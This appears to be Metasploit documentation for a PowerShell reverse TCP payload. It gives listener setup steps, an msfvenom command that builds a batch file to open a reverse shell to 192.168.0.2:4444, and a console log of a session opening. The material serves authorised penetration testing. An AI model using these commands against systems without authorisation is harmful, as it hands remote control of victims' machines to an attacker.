## Vulnerable Application

This powershell payload is suitable for the following environments:

* Windows 7
* Windows Server 2012
* Windows 10

## Verification Steps

1. Do: `use exploit/multi/handler`
2. Do: `set payload cmd/windows/powershell_reverse_tcp`
2. Do: `set LHOST [IP]`
3. Do: `set LPORT [PORT]`
4. Do: `run`

## Scenarios

### Generating a batch file with msfvenom

```
msfvenom -p cmd/windows/powershell_reverse_tcp LHOST=192.168.0.2 LPORT=4444 -o powershell_reverse_tcp.bat
```

The output batch file can be executed directly on the target, or pasted as a command.

### Example usage on Windows 7 target

```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload cmd/windows/powershell_reverse_tcp
payload => cmd/windows/powershell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.0.2
LHOST => 192.168.0.2
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.0.2:4444
[*] Powershell session session 1 opened (192.168.0.2:4444 -> 192.168.0.2:49106 ) at 2021-11-02 12:28:28 +0000

User @ USER-PC
PS C:\Users\User> exit
[*] 192.168.0.2 - Powershell session session 1 closed.
```

## Options

### LOAD_MODULES

A list of powershell modules (separated by a commas) to download.

